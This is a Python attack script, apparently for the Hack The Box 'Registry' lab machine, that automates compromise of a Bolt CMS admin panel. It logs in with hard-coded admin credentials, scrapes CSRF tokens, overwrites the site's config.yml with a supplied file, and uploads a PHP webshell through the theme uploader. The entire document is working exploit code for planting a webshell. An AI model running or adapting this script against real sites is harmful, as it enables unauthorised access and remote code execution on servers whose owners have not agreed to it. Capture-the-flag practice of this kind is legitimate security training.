#!/usr/bin/python
import requests
import json
from bs4 import BeautifulSoup

session = requests.Session()
loginUrl = "https://img/registry.htb/bolt/bolt/login"
uploadUrl = "https://img/registry.htb/bolt/bolt/files/themes"
editUrl = "https://img/registry.htb/bolt/bolt/file/edit/config/config.yml"
webshell = "wwwolf-php-webshell.php"

proxies = {
  'http': 'https://127.0.0.1:8080',
  'https': 'https://127.0.0.1:8080'
}
session.proxies = proxies

# Get CSRF Token for login
resp = session.get(loginUrl, verify=False)
soup = BeautifulSoup(resp.text, 'lxml')
csrf_token = soup.find(id='user_login__token')['value']
print("Login Token: " + csrf_token)

# Login and get auth cookies
loginData = {
  'user_login[username]': 'admin',
  'user_login[password]': 'strawberry',
  'user_login[login]': '',
  'user_login[_token]': csrf_token
}
resp = session.post(loginUrl, data=loginData, verify=False)
print('Auth Cookies: ')
print(session.cookies.get_dict())

# Get CSRF Token for edit
resp = session.get(editUrl, verify=False)
soup = BeautifulSoup(resp.text, 'lxml')
csrf_token = soup.find(id='file_edit__token')['value']
print("Edit Token: " + csrf_token)

# POST config.yml edit
with open('config.txt','rb') as f:
  contents = f.read()

editData = {
  'file_edit[_token]': csrf_token,
  'file_edit[contents]': contents,
  'file_edit[save]':'undefined'
}
resp = session.post(editUrl + '?returnto=ajax', data=editData, verify=False)
jsonResp = json.loads(resp.text)
if jsonResp['ok'] is True:
  print("Edit was successfull")
else:
  print("Edit was NOT successfull")
  print(jsonResp)
  quit()

# Get CSRF Token for upload
resp = session.get(uploadUrl, verify=False)
soup = BeautifulSoup(resp.text, 'lxml')
csrf_token = soup.find(id='file_upload__token')['value']
print("Upload Token: " + csrf_token)

# POST webshell upload
uploadData = {
  'file_upload[select][]': (webshell, open(webshell, 'rb'), 'text/plain'),
  'file_upload[upload]': (None, ''),
  'file_upload[_token]': (None, csrf_token)
}
resp = session.post(uploadUrl, files=uploadData, verify=False)
if 'uploaded successfully' in resp.text:
  print("Upload of webshell was successfull")
else:
  print("Upload was NOT successfull")

